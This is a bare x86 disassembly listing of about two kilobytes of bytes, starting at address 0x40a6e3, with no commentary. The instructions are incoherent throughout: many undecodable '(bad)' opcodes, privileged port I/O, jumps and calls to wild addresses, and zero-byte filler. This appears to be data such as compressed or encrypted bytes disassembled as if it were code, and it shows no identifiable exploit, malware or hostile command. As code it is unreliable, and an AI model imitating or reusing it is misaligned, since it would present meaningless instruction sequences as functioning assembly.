  40a6e3:	and    ch,ch
  40a6e5:	jmp    0xe943b530
  40a6ea:	add    eax,DWORD PTR [eax]
  40a6ec:	mov    ah,cl
  40a6ee:	fild   WORD PTR [eax]
  40a6f0:	add    BYTE PTR [eax],al
  40a6f2:	add    BYTE PTR [eax],al
  40a6f4:	or     ebx,esi
  40a6f6:	cmp    cl,ah
  40a6f8:	imul   ebx,DWORD PTR [edx-0x708abc07],0x9e2ad83b
  40a702:	call   0xea2b1c0a
  40a707:	in     eax,0x75
  40a709:	add    bl,BYTE PTR [edi+eax*4-0x2a]
  40a70d:	fldenv [ebp-0x1697bd1f]
  40a713:	mov    WORD PTR [eax-0x31789bce],?
  40a719:	fisttp WORD PTR [ebp-0x2422d51f]
  40a71f:	jmp    0x40a6a5
  40a721:	inc    edx
  40a722:	jmp    0xd59791ad
  40a727:	ins    DWORD PTR es:[edi],dx
  40a728:	je     0x40a6b9
  40a72a:	arpl   ax,bp
  40a72c:	lahf   
  40a72d:	frstor [ebp+0x34]
  40a730:	sub    bl,ch
  40a732:	repz out 0x64,eax
  40a735:	inc    edx
  40a736:	jmp    0x5227a0c9
  40a73b:	loope  0x40a7b8
  40a73d:	xor    dl,BYTE PTR [ecx+0x2d]
  40a740:	ret    0xe900
  40a743:	loopne 0x40a726
  40a745:	push   cs
  40a746:	ss push edi
  40a748:	ins    DWORD PTR es:[edi],dx
  40a749:	xor    eax,0x3c43541
  40a74e:	jmp    0xfd97b9da
  40a753:	sbb    esi,DWORD PTR [eax+0x69bf2]
  40a759:	add    BYTE PTR [eax],al
  40a75b:	add    BYTE PTR [eax],al
  40a75d:	cmc    
  40a75e:	fsub   st,st(2)
  40a760:	push   edi
  40a761:	arpl   WORD PTR [edx-0x27],bp
  40a764:	sub    BYTE PTR [ebp+0x2],dh
  40a767:	(bad)  
  40a768:	test   BYTE PTR [edx-0x10],0xff
  40a76c:	test   al,0x76
  40a76e:	fadd   st(2),st
  40a770:	add    ch,al
  40a772:	(bad)  
  40a774:	out    0xe6,al
  40a776:	add    ebx,ebp
  40a778:	jmp    0x40a7da
  40a77a:	ret    0x325d
  40a77d:	cs ret 
  40a77f:	or     ebp,ecx
  40a781:	inc    ebx
  40a782:	mov    ebx,ebp
  40a784:	push   0xe900f4e2
  40a789:	jbe    0x40a7bc
  40a78b:	push   esi
  40a78c:	push   ds
  40a78d:	aam    0x15
  40a78f:	mov    ah,0x9c
  40a791:	xor    DWORD PTR [edx],eax
  40a793:	lea    ebx,[ecx+ebp*4]
  40a796:	in     al,0x71
  40a798:	cmp    BYTE PTR [esi+0x2],dh
  40a79b:	test   BYTE PTR [ecx-0x166a799b],ch
  40a7a1:	jbe    0x40a7a5
  40a7a3:	add    DWORD PTR [ecx+eax*4],0x2
  40a7a7:	(bad)  
  40a7a8:	and    al,0x94
  40a7aa:	fdiv   QWORD PTR [ebx-0x29]
  40a7ad:	xchg   ebp,eax
  40a7ae:	push   ebp
  40a7af:	adc    BYTE PTR [edx+0x3b],ah
  40a7b2:	push   cs
  40a7b3:	(bad)  
  40a7b4:	fsubr  QWORD PTR [edx-0x61a68b25]
  40a7ba:	(bad)  
  40a7bb:	std    
  40a7bc:	push   esi
  40a7bd:	xchg   ebp,eax
  40a7be:	test   BYTE PTR [esi+ecx*2+0x0],al
  40a7c2:	add    BYTE PTR [eax],al
  40a7c4:	add    BYTE PTR [eax],al
  40a7c6:	jmp    0x40a80d
  40a7c8:	lock push ecx
  40a7ca:	push   esi
  40a7cb:	xor    eax,DWORD PTR [ecx]
  40a7cd:	jmp    0xb4cc112b
  40a7d2:	dec    edx
  40a7d3:	xor    eax,0xe446b4ff
  40a7d8:	cwde   
  40a7d9:	call   0x19cbaa54
  40a7de:	sti    
  40a7df:	inc    esi
  40a7e0:	lock add DWORD PTR [esi],ebp
  40a7e3:	xor    eax,DWORD PTR [ecx]
  40a7e5:	jmp    0xb47ddd
  40a7ea:	or     eax,0x1c056068
  40a7ef:	add    BYTE PTR [eax+0x40],ch
  40a7f2:	cli    
  40a7f3:	aas    
  40a7f4:	add    BYTE PTR [ebp-0x3186f],cl
  40a7fa:	sbb    ebp,edi
  40a7fc:	mov    esp,0x50001ded
  40a801:	mov    ebx,ebx
  40a803:	xchg   esp,eax
  40a805:	call   0x3f59d8
  40a80a:	popa   
  40a80b:	(bad)  
  40a80c:	jb     0x40a836
  40a80e:	pop    ecx
  40a80f:	jno    0x40a7f7
  40a811:	(bad)  
  40a812:	sub    edi,DWORD PTR [edi+ecx*2-0x44f15e01]
  40a819:	out    dx,al
  40a81a:	(bad)  
  40a81c:	jmp    edi
  40a81e:	mov    esp,0x50fffeb2
  40a823:	(bad)  
  40a824:	jb     0x40a836
  40a826:	jmp    0x40a861
  40a828:	adc    BYTE PTR [edi+0x0],dl
  40a82b:	add    BYTE PTR [eax],al
  40a82d:	add    BYTE PTR [eax],al
  40a82f:	daa    
  40a830:	popa   
  40a831:	or     al,0x56
  40a833:	add    al,0x84
  40a835:	cld    
  40a836:	jmp    FWORD PTR [ebx]
  40a838:	mov    es,WORD PTR [ebx-0x1]
  40a83b:	sub    dh,0xca
  40a83e:	add    BYTE PTR [edi+edi*8+0x1b2b4589],bl
  40a845:	pop    esi
  40a846:	pop    ebx
  40a847:	push   ebp
  40a848:	ror    BYTE PTR [edx],0x0
  40a84b:	adc    ebp,ecx
  40a84d:	jae    0x40a85b
  40a84f:	mov    ebx,0x5cb7e7f4
  40a854:	(bad)  
  40a855:	inc    DWORD PTR [edx+0x32eb0672]
  40a85b:	xlat   BYTE PTR ds:[ebx]
  40a85c:	add    al,0x83
  40a85e:	shl    DWORD PTR [eax+0x16],0x85
  40a862:	shl    cl,0xce
  40a865:	push   0x18f47508
  40a86a:	lock das 
  40a86c:	test   al,0x2
  40a86e:	dec    DWORD PTR [eax+0x753ff1fd]
  40a874:	lock push cs
  40a876:	push   eax
  40a877:	(bad)  
  40a878:	loope  0x40a857
  40a87a:	xor    al,0x25
  40a87c:	pop    ds
  40a87d:	inc    ebx
  40a87e:	add    BYTE PTR [edx],dl
  40a880:	fidivr WORD PTR [edx-0x78164aef]
  40a886:	mov    edi,0xc010e888
  40a88b:	bound  eax,QWORD PTR ss:0x81a874b0
  40a892:	jnp    0x40a894
  40a894:	add    BYTE PTR [eax],al
  40a896:	add    BYTE PTR [eax],al
  40a898:	xchg   ecx,eax
  40a899:	in     eax,0x2
  40a89b:	jne    0x40a90e
  40a89d:	xchg   esp,eax
  40a89e:	adc    al,0xe8
  40a8a0:	dec    edx
  40a8a1:	jmp    0xcb36a8a8
  40a8a6:	add    ch,bl
  40a8a8:	xchg   DWORD PTR [eax+0x5],edx
  40a8ab:	dec    DWORD PTR [ecx-0x33]
  40a8ae:	push   es
  40a8af:	test   DWORD PTR [ebp-0x4daff10b],esi
  40a8b5:	popf   
  40a8b6:	ror    cl,cl
  40a8b8:	ss jmp 0xb709bd9b
  40a8be:	inc    edx
  40a8bf:	add    BYTE PTR [esi+0x756a32bb],cl
  40a8c5:	fs sbb al,dh
  40a8c8:	mov    edi,0x68ff02a7
  40a8cd:	adc    ecx,esi
  40a8cf:	aas    
  40a8d0:	jne    0x40a938
  40a8d2:	ret    
  40a8d3:	je     0x40a94e
  40a8d5:	ffree  st(2)
  40a8d7:	jmp    0x2d74:0xb0055271
  40a8de:	pop    es
  40a8df:	add    dh,dh
  40a8e1:	sub    eax,DWORD PTR [edi]
  40a8e3:	push   eax
  40a8e4:	fild   WORD PTR [edx]
  40a8e6:	icebp  
  40a8e7:	fiadd  WORD PTR [ecx+0x754232d2]
  40a8ed:	fsincos 
  40a8ef:	mov    bh,0x64
  40a8f1:	inc    edx
  40a8f2:	jmp    0xcd97a0b9
  40a8f7:	pop    es
  40a8f8:	jne    0x40a949
  40a8fa:	in     eax,0x12
  40a8fc:	add    BYTE PTR [eax],al
  40a8fe:	add    BYTE PTR [eax],al
  40a900:	add    BYTE PTR ds:0xa6dedaee,dh
  40a906:	push   ds
  40a907:	in     eax,0x69
  40a909:	jne    0x40a8e4
  40a90b:	sbb    edx,esp
  40a90d:	cmp    al,0x46
  40a90f:	jmp    0xfaef12f0
  40a914:	inc    ebx
  40a915:	jne    0x40a8db
  40a917:	in     al,0x3
  40a919:	not    BYTE PTR [esi+0xd]
  40a91c:	or     BYTE PTR [ebp+0x4e],dh
  40a91f:	fcmovnu st,st(4)
  40a921:	pushw  ds
  40a923:	in     eax,dx
  40a924:	imul   esi,DWORD PTR [ebp-0x27],0x45bcd3f3
  40a92b:	jmp    0xfaf30b0c
  40a930:	inc    ebx
  40a931:	jne    0x40a8f7
  40a933:	in     al,dx
  40a934:	add    esp,DWORD PTR [ebx]
  40a936:	lea    ebx,[eax-0x21b14c79]
  40a93c:	xchg   BYTE PTR [eax-0x5db225b2],ah
  40a942:	push   cs
  40a943:	ds in  al,dx
  40a945:	stos   BYTE PTR es:[edi],al
  40a946:	fldcw  WORD PTR [ebp-0x23]
  40a949:	stc    
  40a94a:	rcr    bl,1
  40a94c:	shl    BYTE PTR [ebx],1
  40a94e:	jmp    0xc0b6:0xd983dd26
  40a955:	and    BYTE PTR [ecx],dh
  40a957:	mov    eax,0xdd1ee688
  40a95c:	mov    dh,ch
  40a95e:	push   ds
  40a95f:	(bad)  [eax-0x2effe152]
  40a965:	add    BYTE PTR [eax],al
  40a967:	add    BYTE PTR [eax],al
  40a969:	add    BYTE PTR [ebp-0x5b],al
  40a96c:	pop    eax
  40a96d:	mov    ss,WORD PTR [eax-0xc16f43c]
  40a973:	leave  
  40a974:	jae    0x40a96b
  40a976:	mov    BYTE PTR [ebp-0x7891328d],cl
  40a97c:	add    esp,ebx
  40a97e:	pop    ebp
  40a97f:	aam    0x47
  40a981:	mov    al,0xfc
  40a983:	hlt    
  40a984:	add    eax,0xf74e2971
  40a989:	xchg   edi,eax
  40a98a:	xor    al,0x5
  40a98c:	add    BYTE PTR [edi-0xadbaacf],dl
  40a992:	push   ds
  40a993:	popa   
  40a994:	(bad)  
  40a995:	fisub  WORD PTR [ecx]
  40a997:	mov    edi,gs
  40a999:	ins    BYTE PTR es:[edi],dx
  40a99a:	and    BYTE PTR [ebp+0x12],dl
  40a99d:	into   
  40a99e:	dec    edx
  40a99f:	push   ds
  40a9a0:	or     al,0xc6
  40a9a2:	inc    edx
  40a9a3:	push   ds
  40a9a4:	or     al,0x17
  40a9a6:	shr    ch,0x3b
  40a9a9:	fbstp  TBYTE PTR [esi]
  40a9ab:	add    al,BYTE PTR [ebx-0x3a727d5b]
  40a9b1:	inc    edi
  40a9b2:	mov    bh,0x0
  40a9b4:	add    BYTE PTR [edx+0x71],dh
  40a9b7:	xor    BYTE PTR [ebx-0x18328a67],cl
  40a9bd:	ins    DWORD PTR es:[edi],dx
  40a9be:	rcl    bh,1
  40a9c0:	(bad)  
  40a9c1:	ins    DWORD PTR es:[edi],dx
  40a9c2:	mov    dh,0x54
  40a9c4:	sbb    DWORD PTR [edx-0x78],esi
  40a9c7:	add    eax,0x54b81a37
  40a9cc:	and    al,0xdd
  40a9ce:	add    BYTE PTR [eax],al
  40a9d0:	add    BYTE PTR [eax],al
  40a9d2:	add    BYTE PTR [eax-0x27],cl
  40a9d5:	adc    al,0x25
  40a9d7:	sbb    DWORD PTR [eax],0x0
  40a9da:	push   0xffffffba
  40a9dc:	or     al,0x1
  40a9de:	imul   ch
  40a9e0:	mov    esi,0xc285ebea
  40a9e5:	pop    ebp
  40a9e6:	add    BYTE PTR [esi+0xb55ffff],bl
  40a9ec:	repz (bad) 
  40a9ee:	cmp    DWORD PTR [eax],esp
  40a9f0:	and    BYTE PTR [esi+esi*2],cl
  40a9f3:	sub    DWORD PTR [ebx-0x7693d411],ecx
  40a9f9:	or     al,BYTE PTR [esi]
  40a9fb:	(bad)  
  40a9fc:	sar    DWORD PTR [eax],cl
  40a9fe:	retf   0x6d9
  40aa01:	inc    edi
  40aa02:	inc    eax
  40aa03:	inc    edi
  40aa04:	cmp    BYTE PTR [esp+ecx*1],ah
  40aa07:	scas   al,BYTE PTR es:[edi]
  40aa08:	out    0x31,al
  40aa0a:	rol    BYTE PTR [ebx],0x16
  40aa0d:	ret    0xc04
  40aa10:	pop    es
  40aa11:	mov    dh,0xd2
  40aa13:	xor    ebp,DWORD PTR [esi-0x41]
  40aa16:	sub    ebx,esi
  40aa18:	out    0xef,eax
  40aa1a:	jmp    FWORD PTR [eax+0xc6a0822]
  40aa20:	mov    ebp,0xbcd02472
  40aa25:	adc    eax,DWORD PTR [eax-0x36]
  40aa28:	inc    ebx
  40aa29:	add    BYTE PTR [ebx+0x8c20b18],al
  40aa2f:	int3   
  40aa30:	adc    DWORD PTR [edi+0x39],edx
  40aa33:	and    BYTE PTR [edx],0xc
  40aa36:	jb     0x40aa38
  40aa38:	add    BYTE PTR [eax],al
  40aa3a:	add    BYTE PTR [eax],al
  40aa3c:	mov    edi,0xd0245c26
  40aa41:	lock dec BYTE PTR [ebx+0x74ff0fdc]
  40aa48:	mov    eax,0xc9ff54e7
  40aa4d:	pop    ss
  40aa4e:	push   ss
  40aa4f:	inc    eax
  40aa50:	mov    WORD PTR [eax-0x41f6f33e],es
  40aa56:	jb     0x40aa67
  40aa58:	pop    ebx
  40aa59:	inc    esp
  40aa5a:	cmp    edi,DWORD PTR [eax+edi*2+0xa]
  40aa5e:	jbe    0x40aa45
  40aa60:	pop    edi
  40aa61:	mov    esi,0x2b755e5d
  40aa66:	or     al,0x0
  40aa68:	(bad)  
  40aa69:	push   ds
  40aa6a:	out    dx,eax
  40aa6b:	imul   BYTE PTR [ebp+eiz*4-0x1b19fbe2]
  40aa72:	sbb    eax,0x4eb8e2c8
  40aa77:	adc    DWORD PTR [esi+0x4a51342a],ebx
  40aa7d:	jne    0x40aa9d
  40aa7f:	or     al,0x42
  40aa81:	into   
  40aa82:	push   ss
  40aa83:	push   ss
  40aa84:	mov    ch,0xe9
  40aa86:	test   ebx,eax
  40aa88:	cmp    DWORD PTR [ecx],0x9b77eb05
  40aa8e:	ret    0x79c1
  40aa91:	jmp    0x7c4a35c5
  40aa96:	adc    eax,0x1a70abdb
  40aa9b:	sbb    eax,0x4595e5
  40aaa0:	add    BYTE PTR [eax],al
  40aaa2:	add    BYTE PTR [eax],al
  40aaa4:	add    BYTE PTR [eax+0x20c79a07],cl
  40aaaa:	sub    al,0x4
  40aaac:	push   esi
  40aaad:	repnz int 0xee
  40aab0:	adc    dh,BYTE PTR ds:0x51d1ae9
  40aab6:	outs   dx,BYTE PTR ds:[esi]
  40aab7:	inc    ebp
  40aab8:	add    BYTE PTR [eax-0x44],ah
  40aabb:	mov    ebx,DWORD PTR [ecx*8-0x3ffba5e]
  40aac2:	std    
  40aac3:	outs   dx,DWORD PTR ds:[esi]
  40aac4:	aam    0x36
  40aac6:	jmp    0x9625af8b
  40aacb:	inc    ebp
  40aacc:	add    BYTE PTR [edi+ecx*1-0x25],dh
  40aad0:	adc    al,0x8d
  40aad2:	mov    esp,0x1dee0042
  40aad7:	or     al,0x2b
  40aad9:	mov    dh,0xd4
  40aadb:	cmovs  edi,DWORD PTR ds:0x1482acd
  40aae2:	add    al,BYTE PTR ds:0xb0f2094c
  40aae8:	or     dh,al
  40aaea:	mov    esp,0x957503e8
  40aaef:	cmp    cl,dh
  40aaf1:	stos   BYTE PTR es:[edi],al
  40aaf2:	add    dl,bl
  40aaf4:	pop    ds
  40aaf5:	dec    esi
  40aaf6:	and    DWORD PTR [esi-0x3d],edi
  40aaf9:	add    BYTE PTR [edx-0x17],0x6d
  40aafd:	cwde   
  40aafe:	jmp    0xed6b45d2
  40ab03:	test   al,0x3
  40ab05:	iret   
  40ab06:	sub    dl,BYTE PTR [edx]
  40ab08:	repz add BYTE PTR [eax],al
  40ab0b:	add    BYTE PTR [eax],al
  40ab0d:	add    bl,bh
  40ab0f:	xchg   edx,eax
  40ab10:	inc    BYTE PTR [ebx+0x75]
  40ab13:	push   0x9573eeed
  40ab18:	dec    eax
  40ab19:	icebp  
  40ab1a:	bound  eax,QWORD PTR [edx]
  40ab1c:	xchg   ebx,eax
  40ab1d:	std    
  40ab1e:	aad    0xda
  40ab20:	and    al,BYTE PTR [esi+0x75]
  40ab23:	xor    al,0xb2
  40ab25:	mov    BYTE PTR [ecx-0x4c97aeef],0x42
  40ab2c:	jmp    0xfaff0d09
  40ab31:	inc    ebx
  40ab32:	jne    0x40ab4d
  40ab34:	stos   BYTE PTR es:[edi],al
  40ab35:	push   eax
  40ab36:	mov    ch,BYTE PTR [edx+0x6d]
  40ab39:	dec    edx
  40ab3a:	xor    eax,0x81d91902
  40ab3f:	ret    0x43da
  40ab42:	jne    0x40aae5
  40ab44:	mov    al,0xce
  40ab46:	aaa    
  40ab47:	add    ah,dl
  40ab49:	les    ecx,FWORD PTR [ecx+0x5]
  40ab4c:	push   0xffffffcc
  40ab4e:	mov    ebx,0x37ce90a1
  40ab53:	add    al,BYTE PTR [edx-0x4d252a01]
  40ab59:	inc    ebp
  40ab5a:	jne    0x40aadd
  40ab5c:	sbb    cl,0x26
  40ab5f:	inc    ebx
  40ab60:	add    BYTE PTR [edx+0x5c3d51b9],dh
  40ab66:	xor    cl,BYTE PTR [edx]
  40ab68:	push   ecx
  40ab69:	mov    edx,0xe910020e
  40ab6e:	jbe    0x40ab9d
  40ab70:	(bad)  
  40ab71:	cmp    DWORD PTR [eax],eax
  40ab73:	add    BYTE PTR [eax],al
  40ab75:	add    BYTE PTR [eax],al
  40ab77:	repnz xchg ebp,eax
  40ab79:	je     0x40ab25
  40ab7b:	stc    
  40ab7c:	sub    eax,0x6ba7208
  40ab81:	push   0x277e5
  40ab86:	inc    ecx
  40ab87:	pop    ebp
  40ab88:	(bad)  
  40ab8a:	call   0x7248f9bc
  40ab8f:	sub    esp,edx
  40ab91:	adc    al,0x81
  40ab93:	inc    edi
  40ab94:	adc    eax,0x4e49d200
  40ab99:	and    al,0xe
  40ab9b:	mov    edx,0xf2dcff06
  40aba0:	out    dx,eax
  40aba1:	aas    
  40aba2:	jmp    0xd12badad
  40aba7:	sub    eax,0x3f680c4e
  40abac:	aad    0x2e
  40abae:	jmp    0x3793dd29
  40abb3:	inc    eax
  40abb4:	aad    0x14
  40abb6:	xor    eax,ebp
  40abb8:	adc    al,0x0
  40abba:	fs mov dh,0xe7
  40abbd:	fsincos 
  40abbf:	mov    dh,0x33
  40abc1:	pop    esi
  40abc2:	and    ah,BYTE PTR [edx-0x5c16f840]
  40abc8:	mov    ebx,ebp
  40abca:	sbb    al,dh
  40abcc:	push   ebp
  40abcd:	adc    cl,ch
  40abcf:	xor    al,BYTE PTR [edi]
  40abd1:	mov    esp,DWORD PTR [ecx+eax*8]
  40abd4:	pop    esi
  40abd5:	adc    ecx,0x6a
  40abd8:	dec    edi
  40abd9:	add    al,0x6a
  40abdb:	add    BYTE PTR [eax],al
  40abdd:	add    BYTE PTR [eax],al
  40abdf:	add    BYTE PTR [ebx-0xe],ch
  40abe2:	add    DWORD PTR [eax],eax
  40abe4:	jg     0x40abf6
  40abe6:	mov    esi,DWORD PTR [ebp-0x5c]
  40abe9:	adc    DWORD PTR [ebp-0x2bab640a],eax
  40abef:	add    BYTE PTR [eax+eax*1-0x1777b275],bl
  40abf6:	cmp    esi,esp
  40abf8:	mov    WORD PTR [eax],es
  40abfa:	mov    ebx,eax
  40abfc:	or     edx,esp
  40abfe:	(bad)  
  40abff:	call   FWORD PTR [edi+esi*8-0x22]
  40ac03:	bswap  edi
  40ac05:	jns    0x40ac05
  40ac07:	dec    DWORD PTR [edi+eax*4+0x4b]
  40ac0b:	adc    BYTE PTR [ebx+esi*8-0x76a3ff1b],dh
  40ac12:	inc    ebx
  40ac13:	cld    
  40ac14:	push   edi
  40ac15:	ret    
  40ac16:	or     eax,0xffffa783
  40ac1b:	jmp    DWORD PTR [ecx-0x6ef78c6a]
  40ac21:	mov    edi,0xff9b840d
  40ac26:	(bad)  
  40ac27:	call   DWORD PTR [ecx-0x38d58c41]
  40ac2d:	inc    esp
  40ac2e:	or     al,0x74
  40ac30:	cs jge 0x40ac75
  40ac33:	sbb    ecx,DWORD PTR [esi]
  40ac35:	adc    bh,bh
  40ac37:	jne    0x40ac41
  40ac39:	call   DWORD PTR es:0x3ee488
  40ac40:	pop    edi
  40ac41:	ret    0x560a
  40ac44:	add    BYTE PTR [eax],al
  40ac46:	add    BYTE PTR [eax],al
  40ac48:	add    BYTE PTR [ebx-0x73ec4d2f],bh
  40ac4e:	dec    BYTE PTR [edx-0x1c1d4b32]
  40ac54:	add    ah,bl
  40ac56:	mov    al,BYTE PTR [edx]
  40ac58:	inc    esi
  40ac59:	out    0x2f,eax
  40ac5b:	test   ebx,ebx
  40ac5d:	pusha  
  40ac5e:	dec    ecx
  40ac5f:	mov    ecx,DWORD PTR [ebp+0x75]
  40ac62:	fld    QWORD PTR [edi-0x7d0471cd]
  40ac68:	jnp    0x40acdd
  40ac6a:	jnp    0x40aca3
  40ac6c:	ltr    WORD PTR [edi]
  40ac6f:	pop    es
  40ac70:	xor    esi,DWORD PTR [ebp+0x7a0f3f91]
  40ac76:	les    eax,FWORD PTR cs:[edx]
  40ac79:	cmp    BYTE PTR [ebp+0x3],bl
  40ac7c:	ret    
  40ac7d:	ds sbb al,0x53
  40ac80:	dec    esp
  40ac81:	lods   al,BYTE PTR ds:[esi]
  40ac82:	sahf   
  40ac83:	or     dh,BYTE PTR [ebx+edi*2-0x75]
  40ac87:	xor    edi,edi
  40ac89:	call   0x9955825f
  40ac8e:	stos   DWORD PTR es:[edi],eax
  40ac8f:	inc    edx
  40ac90:	add    dh,dh
  40ac92:	and    al,0x8
  40ac94:	add    eax,eax
  40ac96:	loope  0x40ac1a
  40ac98:	jl     0x40ad0c
  40ac9a:	jmp    0xa62eb9ed
  40ac9f:	or     al,BYTE PTR [ebx+0x6a00e1b8]
  40aca5:	leave  
  40aca6:	xchg   ecx,eax
  40aca7:	pop    esp
  40aca8:	mov    DWORD PTR [eax+edx*2+0x51],esi
  40acac:	or     BYTE PTR [eax],al
  40acae:	add    BYTE PTR [eax],al
  40acb0:	add    BYTE PTR [eax],al
  40acb2:	out    dx,al
  40acb3:	popf   
  40acb4:	(bad)  
  40acb5:	mov    WORD PTR [ecx+0xa5000e9],?
  40acbb:	dec    esi
  40acbc:	repz push ebp
  40acbe:	add    dl,dh
  40acc0:	push   ss
  40acc1:	push   ss
  40acc2:	mov    ch,0xe9
  40acc4:	add    ebx,0x14d71381
  40acca:	and    eax,ebx
  40accc:	inc    edx
  40accd:	add    dh,ch
  40accf:	mov    ds:0xa9a601e9,al
  40acd4:	xor    eax,0xc0a22e5e
  40acd9:	or     esi,DWORD PTR [ebp+0x59]
  40acdc:	add    al,0xc2
  40acde:	jns    0x40ace2
  40ace0:	jmp    0x38269b15
  40ace5:	xor    eax,DWORD PTR [eax]
  40ace7:	cmp    eax,0x38f83395
  40acec:	loope  0x40acd9
  40acee:	dec    esi
  40acef:	xchg   esp,eax
  40acf0:	out    0x3,eax
  40acf2:	out    dx,al
  40acf3:	inc    esp
  40acf4:	in     eax,dx
  40acf5:	mov    WORD PTR [ebp+0x37],?
  40acf8:	ins    BYTE PTR es:[edi],dx
  40acf9:	ret    
  40acfa:	add    esi,edi
  40acfc:	mov    edx,0x69f78fc3
  40ad01:	pop    eax
  40ad02:	jns    0x40ad04
  40ad04:	xlat   BYTE PTR ds:[ebx]
  40ad05:	or     esi,esi
  40ad07:	dec    edi
  40ad08:	loope  0x40ad1b
  40ad0a:	out    0x6,al
  40ad0c:	sbb    al,ah
  40ad0e:	dec    edi
  40ad0f:	push   es
  40ad10:	cli    
  40ad11:	ret    
  40ad12:	call   0x0:0xf3ab7d
  40ad19:	add    BYTE PTR [eax],al
  40ad1b:	cli    
  40ad1c:	add    edi,DWORD PTR [ecx+0x4]
  40ad1f:	cmp    al,0xc5
  40ad21:	fadd   QWORD PTR [ebx]
  40ad23:	test   al,0x7d
  40ad25:	adc    al,0x82
  40ad27:	push   esi
  40ad28:	retf   
  40ad29:	imul   esp,edi,0x8abf357e
  40ad2f:	and    eax,0x6d355c3a
  40ad34:	pop    esp
  40ad35:	jmp    0x74bce4c4
  40ad3a:	pop    ds
  40ad3b:	ins    DWORD PTR es:[edi],dx
  40ad3c:	ficom  DWORD PTR [ecx-0x66]
  40ad3f:	jne    0x40ad43
  40ad41:	gs ret 
  40ad43:	xchg   BYTE PTR [esi-0x1a],al
  40ad46:	push   ecx
  40ad47:	jno    0x40adc6
  40ad49:	popa   
  40ad4a:	or     dl,dh
  40ad4c:	adc    eax,0x447cac1
  40ad51:	jmp    0xd897cfd5
  40ad56:	mov    BYTE PTR [edi-0x2],ah
  40ad59:	sar    BYTE PTR [edi+0x26],1
  40ad5c:	add    al,0x0
  40ad5e:	jmp    0xda64f36b
  40ad63:	ja     0x40aceb
  40ad65:	mov    edi,0x43c7ba1c
  40ad6a:	lds    esp,FWORD PTR [ebp+0x7d2a89d1]
  40ad70:	test   DWORD PTR [edi-0x3f],esi
  40ad73:	jbe    0x40adf2
  40ad75:	cli    
  40ad76:	test   BYTE PTR [edx],0x91
  40ad79:	dec    edi
  40ad7a:	xchg   ecx,eax
  40ad7b:	add    eax,0xe9008d
  40ad80:	add    BYTE PTR [eax],al
  40ad82:	add    BYTE PTR [eax],al
  40ad84:	test   BYTE PTR [ebp+0x24],0xda
  40ad88:	jbe    0x40ade1
  40ad8a:	or     eax,0x14262572
  40ad8f:	push   0x33
  40ad91:	stc    
  40ad92:	push   ebp
  40ad93:	inc    ecx
  40ad94:	test   BYTE PTR [ebx],bh
  40ad96:	add    ch,cl
  40ad98:	in     eax,dx
  40ad99:	inc    ebp
  40ad9a:	or     BYTE PTR [ecx-0x13],dl
  40ad9d:	inc    ebx
  40ad9e:	add    ch,cl
  40ada0:	mov    DWORD PTR [eax],esi
  40ada2:	mov    al,0xe8
  40ada4:	lea    edi,[ebp-0x1c]
  40ada7:	mov    WORD PTR [eax*1+0x41e8f600],?
  40adae:	add    al,0xb9
  40adb0:	push   ds
  40adb1:	cmp    eax,0x7d76e8be
  40adb6:	dec    ebx
  40adb7:	lds    ebp,FWORD PTR [esi+0x7b]
  40adba:	add    BYTE PTR [edx-0x4b],dh
  40adbd:	es or  al,0x27
  40adc0:	jns    0x40adc5
  40adc2:	xor    ebp,DWORD PTR [ecx]
  40adc4:	outs   dx,BYTE PTR ds:[esi]
  40adc5:	add    ecx,DWORD PTR [edi]
  40adc7:	push   esp
  40adc8:	cmp    ebx,eax
  40adca:	or     ebp,ecx
  40adcc:	in     eax,dx
  40adcd:	inc    esp
  40adce:	and    al,0xe5
  40add0:	fidiv  WORD PTR [edi]
  40add2:	inc    ebx
  40add3:	jmp    0x40ae4b
  40add5:	xchg   edx,eax
  40add6:	add    BYTE PTR [ebx+0xf4d0e2],ch
  40addc:	mov    BYTE PTR [edx],ah
  40adde:	add    al,0x1
  40ade0:	push   0x7b
  40ade2:	out    dx,eax
  40ade3:	(bad)  
  40ade4:	fiadd  DWORD PTR [ebp+ecx*4+0x40]
  40adeb:	add    BYTE PTR [eax],al
  40aded:	int3   
  40adee:	inc    eax
  40adef:	push   es
  40adf0:	push   esi
  40adf1:	in     al,0x5b
  40adf3:	sti    
  40adf4:	call   DWORD PTR [ebx]
  40adf6:	jp     0x40adbc
  40adf8:	pop    esi
  40adf9:	(bad)  
  40adfb:	dec    BYTE PTR [esi]
  40adfd:	dec    edx
  40adfe:	inc    esp
  40adff:	add    al,0x83
  40ae01:	add    al,0x5
  40ae03:	je     0x40ae11
  40ae05:	inc    esp
  40ae06:	xor    al,BYTE PTR [ebx]
  40ae08:	xor    ebx,esp
  40ae0a:	shl    DWORD PTR [esi+0x7694ce14],0xc3
  40ae11:	aam    0xd1
  40ae13:	rcl    al,0x54
  40ae16:	ret    
  40ae17:	push   ebx
  40ae18:	mov    esi,DWORD PTR [eax-0x32071d7e]
  40ae1e:	out    0x92,eax
  40ae20:	add    al,0x4c
  40ae22:	add    al,0x53
  40ae24:	push   esi
  40ae25:	jmp    0x40aea1
  40ae27:	test   DWORD PTR [edi],0x83040eca
  40ae2d:	mov    ah,0x3
  40ae2f:	mov    DWORD PTR [eax+ebp*1-0x34],edi
  40ae33:	jb     0x40ae4a
  40ae35:	in     al,0x40
  40ae37:	sub    al,bh
  40ae39:	fsubr  st,st(7)
  40ae3b:	or     ebx,DWORD PTR [esi]
  40ae3d:	or     al,0x4
  40ae3f:	add    bh,al
  40ae41:	enter  0x13ef,0x30
  40ae45:	mov    DWORD PTR [ebx],eax
  40ae47:	add    bl,ch
  40ae49:	sub    al,0x8f
  40ae4b:	inc    edx
  40ae4c:	and    al,0x20
  40ae4e:	loopne 0x40ae4e
  40ae50:	inc    DWORD PTR [eax]
  40ae52:	add    BYTE PTR [eax],al
  40ae54:	add    BYTE PTR [eax],al
  40ae56:	or     al,0xbd
  40ae58:	inc    edx
  40ae59:	and    al,0xe8
  40ae5b:	arpl   dx,bp
  40ae5d:	add    BYTE PTR [ebp-0x27],dh
  40ae60:	leave  
  40ae61:	inc    ebx
  40ae62:	cdq    
  40ae63:	leave  
  40ae64:	cld    
  40ae65:	(bad)  
  40ae66:	fcmovu st,st(1)
  40ae68:	jge    0x40aead
  40ae6a:	cdq    
  40ae6b:	fstp   QWORD PTR [ebx-0x40]
  40ae6e:	push   ebp
  40ae6f:	ret    
  40ae70:	add    eax,DWORD PTR [eax]
  40ae72:	in     al,dx
  40ae73:	and    eax,0x1dee0c28
  40ae78:	sub    BYTE PTR [eax],dl
  40ae7a:	sbb    al,0x99
  40ae7c:	arpl   dx,bp
  40ae7e:	jne    0x40ae59
  40ae80:	jnp    0x40aec5
